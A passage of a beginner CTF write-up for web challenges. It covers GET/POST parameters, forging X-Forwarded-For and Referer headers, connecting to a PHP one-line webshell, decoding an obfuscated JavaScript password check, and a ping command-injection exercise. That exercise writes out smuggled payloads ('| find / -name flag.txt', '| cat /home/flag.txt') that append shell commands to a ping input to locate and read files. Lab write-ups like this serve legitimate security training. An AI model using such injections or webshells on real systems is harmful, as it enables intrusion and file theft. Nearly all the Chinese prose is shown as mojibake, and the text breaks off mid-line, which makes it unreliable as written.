id="2ï¼‰wp-1"><a href="#2ï¼‰wp-1" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>Getå’ŒPostæ–¹å¼æ˜¯HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•</p><p>Getæ–¹å¼ç›´æ¥åœ¨urlè¾“å…¥?a&#x3D;1</p><p><code>http://111.200.241.244:52081/?a=1</code></p><p>Postæ–¹å¼åˆ©ç”¨ç«ç‹æ’ä»¶HackerBarä»¥postæ–¹å¼b&#x3D;2</p><p>run</p><p><img src="/2022/06/21/Gongfang-wp/image-20220624164728734.png" alt="image-20220624164728734"></p><p>å¾—åˆ°flag</p><h2 id="9-xff-referer"><a href="#9-xff-referer" class="headerlink" title="9.xff_referer"></a>9.xff_referer</h2><h3 id="1-é¢˜ç›®æè¿°-8"><a href="#1-é¢˜ç›®æè¿°-8" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥ä¼ªé€ çš„</p><h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆäº†è§£ä»€ä¹ˆæ˜¯xxfå’Œreferer</p><p><code>ï¼ˆ1ï¼‰X-Forwarded-For:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP  ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚xffæ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯ä½¿WebæœåŠ¡å™¨è·å–è®¿é—®ç”¨æˆ·çš„IPçœŸå®åœ°å€ï¼ˆå¯ä¼ªé€ ï¼‰ã€‚ç”±äºå¾ˆå¤šç”¨æˆ·é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨åªèƒ½è·å–ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œxffçš„ä½œç”¨åœ¨äºè®°å½•ç”¨æˆ·çš„çœŸå®IPï¼Œä»¥åŠä»£ç†æœåŠ¡å™¨çš„IPã€‚æ ¼å¼ä¸ºï¼šX-Forwarded-For: æœ¬æœºIP, ä»£ç†1IP, ä»£ç†2IP, ä»£ç†2IP</code></p><p><code>ï¼ˆ2ï¼‰HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨åŸºæ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚referer  æ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯è®°å½•å½“å‰è¯·æ±‚é¡µé¢çš„æ¥æºé¡µé¢çš„åœ°å€ã€‚æœåŠ¡å™¨ä½¿ç”¨refererç¡®è®¤è®¿é—®æ¥æºï¼Œå¦‚æœrefererå†…å®¹ä¸ç¬¦åˆè¦æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æ‹¦æˆªæˆ–è€…é‡å®šå‘è¯·æ±‚ã€‚</code></p><p>æŠ“åŒ…åï¼Œå‘ç°å¹¶æ²¡æœ‰X-Forwarded-Forå’ŒRefererï¼ŒåŠ ä¸Šå³å¯</p><p><img src="/2022/06/21/Gongfang-wp/image-20220624173529705.png" alt="image-20220624173529705"></p><p>çœ‹é¢˜ç•Œé¢ï¼Œæç¤ºipå¿…é¡»ä¸º123.123.123.123ï¼Œäºæ˜¯åœ¨æŠ“åŒ…æ•°æ®é‡ŒåŠ ä¸Š</p><p><code>X-Forwarded-Forï¼š 123.123.123.123</code></p><p><img src="/2022/06/21/Gongfang-wp/image-20220624174546646.png" alt="image-20220624174546646"></p><p>sendæ•°æ®åï¼Œå‘ç°responseé‡Œå‡ºç°ä»¥ä¸‹æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜æœ‰å£°æ˜æ˜¯ä»è°·æ­Œç•Œé¢è¿‡æ¥çš„</p><p><img src="/2022/06/21/Gongfang-wp/image-20220624173805175.png" alt="image-20220624173805175"></p><p>ä¹Ÿå°±æ˜¯è¿˜è¦åŠ ä¸Š</p><p><code>Referer:  https://www.google.com</code></p><p>æœ€åå¦‚ä¸‹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220624174117936.png" alt="image-20220624174117936"></p><p>sendåˆ°responseå</p><p>å¾—åˆ° flag</p><h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><h3 id="1-é¢˜ç›®æè¿°-9"><a href="#1-é¢˜ç›®æè¿°-9" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®ç™¾åº¦äº†phpä¸€å¥è¯,è§‰ç€å¾ˆæœ‰æ„æ€,å¹¶ä¸”æŠŠå®ƒæ”¾åœ¨index.phpé‡Œ</p><h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åˆ°è¿™å¥ä»£ç æˆ‘ä¸€ä¸‹æƒ³åˆ°ä¸€å¥è¯æœ¨é©¬ï¼Œæ ‡é¢˜<a href="../../../../2022/06/21/Qusetion/">webshell</a>ä¹Ÿæç¤ºè¿™ä¸ªæœ¨é©¬é¢˜ï¼Œæ ¹æ®æè¿°æˆ‘ä»¬çŸ¥é“è¿™ä¸ªæœ¨é©¬åœ¨index.phpé‡Œ</p><p>ä¸äº†è§£çš„å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« </p><p><a href="https://www.jianshu.com/p/6b815f951db3">phpä¸€å¥è¯æœ¨é©¬</a></p><p><img src="/2022/06/21/Gongfang-wp/image-20220624210259387.png" alt="image-20220624210259387"></p><p>ç”¨èšå‰‘è¿æ¥å³å¯ï¼Œè¿™é‡Œå¯¹èšå‰‘ä½¿ç”¨æ–¹æ³•ä¸èµ˜è¿°ï¼Œå»ºè®®è‡ªå·±æ“ä½œå­¦ä¹ </p><p>å¾—åˆ°flag</p><h2 id="11-command-execution"><a href="#11-command-execution" class="headerlink" title="11.command_execution"></a>11.command_execution</h2><h3 id="1-é¢˜ç›®æè¿°-10"><a href="#1-é¢˜ç›®æè¿°-10" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å†™äº†ä¸ªpingåŠŸèƒ½,ä½†æ²¡æœ‰å†™waf,Xè€å¸ˆå‘Šè¯‰å¥¹è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—ã€‚</p><h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>æ ¹æ®é¢˜ç›®åçŸ¥é“è¿™æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´çš„é¢˜ï¼Œå¯ä»¥å…ˆäº†è§£ä¸€ä¸‹<a href="../../../../2022/05/28/Web-study">å‘½ä»¤æ‰§è¡Œ</a>çš„çŸ¥è¯†</p><p>å…ˆç”¨è‡ªå·±çš„IPè¯•ä¸€ä¸‹</p><p><code>120.0.0.1</code></p><p><img src="/2022/06/21/Gongfang-wp/image-20220624213448262.png" alt="image-20220624213448262"></p><p>å¾—åˆ°ä»¥ä¸‹æ•°æ®ï¼Œç”±æ­¤å¯çŸ¥æˆ‘ä»¬ä¸Šä¼ çš„å‘½ä»¤æ˜¯<code>ping -c 3 + è¾“å…¥çš„è¯­å¥</code>ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°ç®¡é“ç¬¦</p><p>æ­¤å¤„ä¸æ­¢å¯ä»¥ç”¨ |ï¼Œäº†è§£äº†å…¶ä»–ç®¡é“ç¬¦çš„ä½œç”¨ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœ</p><p><img src="/2022/06/21/Gongfang-wp/image-20220624215127339.png" alt="image-20220624215127339"></p><p>åœ¨åˆ©ç”¨ç®¡é“ç¬¦ï¼Œåœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•æŸ¥æ‰¾æœ‰æ²¡æœ‰åä¸ºflag.txtçš„æ–‡ä»¶</p><p><code>120.0.0.1 | find  / -name flag.txt</code></p><p><img src="/2022/06/21/Gongfang-wp/image-20220624215415187.png" alt="image-20220624215415187"></p><p>å¾—åˆ°flag.txtçš„ä½ç½®çš„ç»å¯¹è·¯å¾„</p><p>è¾“å‡ºæ‰“å°flag,txt</p><p><code>120.0.0.1 | cat /home/flag.txt</code></p><p>å¾—åˆ°flag</p><h2 id="12-simple-js"><a href="#12-simple-js" class="headerlink" title="12.simple_js"></a>12.simple_js</h2><h3 id="1ï¼‰é¢˜ç›®æè¿°"><a href="#1ï¼‰é¢˜ç›®æè¿°" class="headerlink" title="1ï¼‰é¢˜ç›®æè¿°"></a>1ï¼‰é¢˜ç›®æè¿°</h3><p>å°å®å‘ç°äº†ä¸€ä¸ªç½‘é¡µï¼Œä½†å´ä¸€ç›´è¾“ä¸å¯¹å¯†ç ã€‚</p><p>(Flagæ ¼å¼ä¸º Cyberpeace{xxxxxxxxx} )</p><h3 id="2ï¼‰wp-2"><a href="#2ï¼‰wp-2" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¯¥é¢˜æ¶‰åŠä»£ç å®¡è®¡ï¼Œçœ‹èµ·æœ‰ç‚¹éš¾åº¦ï¼Œä½†è¯´å®è¯å¤§éƒ¨åˆ†å†…å®¹ä¸ä»£ç å®¡è®¡æ— å…³ï¼Œä½†å¯ä»¥åˆ†æä¸€ä¸‹</p><p>å¼€å§‹ç•Œé¢å¼¹çª—è¾“å…¥å¯†ç </p><p><img src="/2022/06/21/Gongfang-wp/image-20220624221241740.png" alt="image-20220624221241740"></p><p>è¾“å…¥é”™è¯¯ï¼Œæç¤ºFAUX PASSWORD HAHA</p><p><img src="/2022/06/21/Gongfang-wp/image-20220624221310762.png" alt="image-20220624221310762"></p><p>æˆ‘ä»¬F12æŠŠå®ƒæºç æ‹¿å‡ºæ¥åˆ†æä¸€ä¸‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        j = tab.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        k = j + (l) + (n=<span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">        n = tab2.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">    &#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">               &#123;</span></span><br><span class="line"><span class="language-javascript">                   o = tab[i-l];</span></span><br><span class="line"><span class="language-javascript">                   <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">                   p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span><br><span class="line"><span class="language-javascript">        pass = p;<span class="keyword">return</span> pass;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°å¼€å¤´ä¸€å¤§ä¸²ä»£ç å…ˆä¸ç€æ€¥ï¼ŒæŒ¨ä¸ªåˆ†æ</p><p>æœ€æ˜¾çœ¼çš„å°±æ˜¯è¿™ä¸²16è¿›åˆ¶ç </p><p><code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code></p><p>æˆ‘ä»¬å¯ä»¥å…ˆç”¨python ç›´æ¥è¾“å‡ºï¼Œå¾—åˆ°10è¿›åˆ¶</p><p><img src="/2022/06/21/Gongfang-wp/image-20220624223640446.png" alt="image-20220624223640446"></p><p>è¿™é‡Œæˆ‘ä»¬æŠŠè¿™ä¸²10è¿›åˆ¶æ•°æŒ‰asciiç è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p><p>786OsErtk12</p><p>æŒ‰æè¿°å¡«å†™ </p><p>å¾—åˆ°flag : Cyberpeace{786OsErtk12}</p><hr><p>æˆ‘å¯¹ä»£ç å®¡è®¡è¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œä¸‹é¢å¼•ç”¨ä¸€ç¯‡å¤§ä½¬çš„ä»£ç å®¡è®¡</p><p><a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">æ‰§è¡Œæµç¨‹ï¼š</span><br><span class="line">ä¸€ã€é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ª<span class="variable">dechiffre</span>å‡½æ•°ï¼Œå’±å…ˆä¸ç®¡ï¼Œå› ä¸ºè¿˜æ²¡æœ‰è°ƒç”¨</span><br><span class="line">æ³¨ï¼šå…ˆå°†\<span class="variable">x35</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x37</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x36</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x30</span>\<span class="variable">x37</span>\<span class="variable">x2c</span>\<span class="variable">x34</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x30</span>åå…­è¿›åˆ¶æ•°è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œ<span class="variable">python</span>ä¸‹<span class="variable">print</span>å³å¯ï¼Œæˆ–ç½‘å€ï¼š<span class="variable">https</span>:<span class="comment">//www.bejson.com/convert/ox2str/</span></span><br><span class="line">è¾“å‡ºç»“æœ<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span></span><br><span class="line"></span><br><span class="line">äºŒã€æ‰§è¡Œ<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line"></span><br><span class="line">ä¸‰ã€è°ƒç”¨äº†<span class="variable">dechiffre</span>ï¼Œæ‰§è¡Œ<span class="variable">dechiffre</span>å‡½æ•°</span><br><span class="line"><span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line">(<span class="number">1</span>)å…ˆå°†<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>å¸¦å…¥<span class="variable">dechiffre</span>å‡½æ•°æ‰§è¡Œï¼Œå³<span class="title function_">dechiffre</span>(<span class="variable">pass_enc</span>)<span class="operator">=</span><span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)æ¥ç€æˆ‘ä»¬çœ‹åˆ°äº†<span class="variable">pass</span>å˜é‡ï¼Œæš‚æ—¶å…ˆæ”¾ç€</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)å› ä¸º<span class="variable">pass_enc</span><span class="operator">=</span><span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50&quot;</span></span><br><span class="line">å°†<span class="variable">pass_enc</span>å­—ç¬¦ä¸²åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼Œèµ‹å€¼ç»™<span class="variable">tab</span>å‚æ•°ï¼Œæ‰€ä»¥ï¼š</span><br><span class="line"><span class="variable">tab</span><span class="operator">=</span>[<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]   æ³¨ï¼š<span class="variable">tab</span>æ­¤æ—¶æ˜¯å­—ç¬¦ä¸²æ•°ç»„ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)éšåä¹Ÿå¯¹<span class="variable">pass</span>åˆ†å‰²</span><br><span class="line"><span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)å˜é‡èµ‹å€¼ä»£ç åˆ†æï¼š<span class="keyword">var</span> <span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,<span class="variable">p</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="variable">j</span> <span class="operator">=</span> <span class="variable">tab</span>.<span class="property">length</span>;</span><br><span class="line">ä¸€å¼€å§‹<span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,æ²¡æœ‰èµ‹å€¼ï¼Œä¸º<span class="variable">undefined</span>ï¼Œå…¶å®ƒå‚æ•°<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>ï¼Œ<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span>ï¼Œåæ¥<span class="variable">i</span>è¢«èµ‹å€¼<span class="operator">=</span><span class="number">0</span>ï¼Œ<span class="variable">j</span>è¢«èµ‹å€¼ä¸º<span class="number">11</span></span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)ç¬¬ä¹è¡Œæ­¤æ—¶<span class="variable">n</span>è¢«èµ‹å€¼ä¸º<span class="number">0</span>ï¼Œæ‰€ä»¥<span class="variable">k</span><span class="operator">=</span><span class="number">11</span><span class="operator">+</span><span class="number">0</span><span class="operator">+</span><span class="number">0</span>ï¼Œæœ€åç­‰äº<span class="number">11</span>    æ³¨ï¼šè¿™é‡Œçš„(<span class="variable">l</span>)å…¶ä¸­æ˜¯è‹±æ–‡å­—æ¯<span class="variable">l</span>ï¼Œä¸æ˜¯æ•°å­—<span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)ç¬¬åè¡Œä¸­ï¼Œ<span class="variable">n</span><span class="operator">=</span><span class="number">18</span></span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)ç¬¬ä¸€ä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œç²¾ç®€ä¸€ä¸‹ä»£ç ï¼š</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> (<span class="number">18</span>); <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )</span><br><span class="line">&#123;<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">==</span> <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">è§£é‡Šï¼šå‰é¢çš„<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="variable">i</span><span class="number">-1</span>]æ˜¯æ— ç”¨çš„ï¼Œå› ä¸ºåé¢ä¼šè¢«<span class="variable">o</span><span class="operator">=</span><span class="variable">tab2</span>[<span class="variable">i</span>]çš„å€¼é‡æ–°è¦†ç›–</span><br><span class="line">ç¬¬ä¸€æ¬¡å¾ªç¯ï¼š<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="number">0</span>];<span class="variable">p</span><span class="operator">=</span><span class="variable">p</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="number">0</span>])</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span><span class="variable">o</span><span class="operator">=</span><span class="number">70</span>;<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">70</span>)<span class="operator">=</span><span class="operator">&gt;</span><span class="variable">p</span><span class="operator">=</span>è‹±æ–‡å­—æ¯<span class="variable">F</span></span><br><span class="line">ç¬¬äºŒæ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬ä¸‰æ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬å››æ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬äº”æ¬¡<span class="operator">...</span></span><br><span class="line">æ‰€ä»¥ï¼Œè¿™ä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œæœ€åçš„<span class="variable">p</span>ä¸ºï¼ˆå°½ç®¡æ²¡æœ‰è¾“å‡ºå‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ä»¬çŸ¥é“å°±å¥½ï¼‰<span class="variable">FAUX</span> <span class="title function_">P</span></span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)ç¬¬äºŒä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œç²¾ç®€ä¸€ä¸‹ä»£ç ï¼š</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">18</span>; <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )&#123;</span><br><span class="line"><span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">&gt;</span> <span class="number">5</span> <span class="operator">&amp;&amp;</span> <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">17</span>)</span><br><span class="line">        <span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> 